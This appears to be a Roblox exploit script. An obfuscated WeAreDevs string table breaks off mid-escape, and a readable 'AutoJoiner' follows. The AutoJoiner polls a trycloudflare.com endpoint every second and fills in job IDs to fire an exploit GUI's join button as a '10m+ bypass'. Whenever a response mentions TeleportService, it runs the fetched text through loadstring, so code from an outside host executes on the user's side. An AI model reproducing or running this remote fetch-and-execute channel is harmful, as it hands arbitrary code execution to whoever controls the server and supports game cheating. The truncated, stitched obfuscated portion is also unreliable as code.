--[[ v1.0.0 https://wearedevs.net/obfuscator ]] return(function(...)local E={"\079\049\117\111\067\115\074\068","\108\084\074\112\052\104\061\061";"\109\086\122\066\075\075\051\089\116\082\109\067\090\115\067\119\109\083\079\061","\056\115\074\057\056\048\067\084\116\049\107\118\056\075\074\111","\067\108\050\076\116\086\081\061","\090\115\074\111\090\075\084\077\067\108\081\061","\071\115\117\086\099\108\107\072\053\075\074\052\066\082\084\108\067\066\118\061","\090\075\069\104\052\075\107\105";"\079\048\122\118\116\075\122\118\052\108\109\119\052\049\051\120";"\089\077\114\120\067\043\085\098\089\114\061\061";"\080\072\109\118\079\082\090\120\090\070\061\061";"\109\072\050\052\109\115\074\097\079\066\067\066\107\086\122\066\080\104\061\061";"\067\048\117\068\067\099\061\061","\056\118\051\076\067\078\090\055\056\115\109\057\078\118\119\069","\080\072\107\056\116\117\083\051\066\108\119\108\080\117\067\120","\122\115\117\068\079\115\122\076\081\082\109\120\090\115\122\106\090\115\122\083\081\099\061\061";"\090\115\074\073\090\072\050\098\116\049\079\061";"\079\086\109\076\056\075\069\112","";"\067\049\051\057\116\086\081\061","\089\114\061\061","\079\049\122\051\090\075\122\073\090\070\061\061";"\116\115\074\119\067\072\107\118\079\049\120\111\067\104\061\061";"\116\066\074\052\080\104\061\061","\116\049\122\086\052\04

(function()
    repeat task.wait() until game:IsLoaded()
    local HttpService = game:GetService("HttpService")
    local EndpointURL =  "https://jj-trademark-networking-assurance.trycloudflare.com/"

    local function prints(str)
        print("[AutoJoiner]: " .. str)
    end

    -- UT: safe HTTP fetch
    local function UT()
        local response
        local success, err = pcall(function()
            response = HttpService:RequestAsync({
                Url = EndpointURL,
                Method = "GET",
                Headers = {["Content-Type"] = "application/json"}
            })
        end)
        if success and response and response.Body and #response.Body > 0 then
            return response.Body
        else
            prints("HTTP request failed or returned nil, retrying...")
            return nil
        end
    end

    local function findTargetGui()
        for _, gui in ipairs(game:GetService("CoreGui"):GetChildren()) do
            if not gui:IsA("ScreenGui") then continue end
            for _, descendant in ipairs(gui:GetDescendants()) do
                if descendant:IsA("TextLabel") and descendant.Text == "Job-ID Input" then
                    return descendant:FindFirstAncestorOfClass("ScreenGui")
                end
            end
        end
    end

    local function setJobIDText(targetGui, text)
        for _, btn in ipairs(targetGui:GetDescendants()) do
            if btn:IsA("TextButton") then
                local frames = {}
                for _, child in ipairs(btn:GetChildren()) do
                    if child:IsA("Frame") then
                        table.insert(frames, child)
                    end
                end
                if #frames < 2 then continue end

                local foundLabel = false
                for _, descendant in ipairs(frames[1]:GetDescendants()) do
                    if descendant:IsA("TextLabel") and descendant.Text == "Job-ID Input" then
                        foundLabel = true
                        break
                    end
                end
                if not foundLabel then continue end

                for _, subFrame in ipairs(frames[2]:GetChildren()) do
                    if subFrame:IsA("Frame") then
                        for _, obj in ipairs(subFrame:GetDescendants()) do
                            if obj:IsA("TextBox") then
                                obj.Text = text
                                prints("Textbox updated: " .. text .. " (10m+ bypass)")
                                return obj
                            end
                        end
                    end
                end
            end
        end
        return nil
    end

    local function clickJoinButton(targetGui)
        local function findButton(base)
            for _, btn in ipairs(base:GetDescendants()) do
                if btn:IsA("TextButton") then
                    for _, content in ipairs(btn:GetDescendants()) do
                        if content:IsA("TextLabel") and content.Text == "Join Job-ID" then
                            return btn
                        end
                    end
                end
            end
        end

        local current = targetGui
        for _ = 1, 4 do
            local button = findButton(current)
            if button then return button end
            current = current.Parent
            if not current then break end
        end
        return nil
    end

    local function bypass10M(jobId)
        local targetGui = findTargetGui()
        if not targetGui then
            prints("Target GUI not found.")
            return
        end
        setJobIDText(targetGui, jobId)
        local button = clickJoinButton(targetGui)
        if not button then
            prints("Join button not found.")
            return
        end
        task.defer(function()
            task.wait(0.05)
            for _, conn in ipairs(getconnections(button.MouseButton1Click)) do
                conn:Fire()
                prints("Join server clicked (10m+ bypass)")
            end
        end)
    end

    local function justJoin(script)
        local func, err = loadstring(script)
        if func then
            local ok, result = pcall(func)
            if not ok then
                prints("Error while executing script: " .. result)
            end
        else
            prints("Unexpected error: " .. err)
        end
    end

    local function pollServer()
        while true do
            local msg = UT() -- use the robust UT function
            if msg and msg ~= "" then
                if not string.find(msg, "TeleportService") then
                    prints("Bypassing 10m server: " .. msg)
                    bypass10M(msg)
                else
                    prints("Running the script: " .. msg)
                    justJoin(msg)
                end
            else
                prints("Failed to fetch job ID, retrying...")
            end

            task.wait(1) -- check every second
        end
    end

    pollServer()
end)()
